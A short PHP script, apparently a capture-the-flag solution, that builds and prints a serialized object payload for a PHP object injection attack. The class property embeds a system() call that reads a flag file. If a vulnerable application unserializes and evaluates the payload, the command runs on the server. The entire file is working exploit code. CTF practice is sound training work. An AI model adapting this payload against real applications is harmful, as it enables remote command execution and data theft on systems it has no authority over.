<?PHP

class suntikan{
    public $inject = "system('cat /fl4g_k3r3n_4bies.txt');";
}

$a = serialize(new suntikan());
echo $a;

?>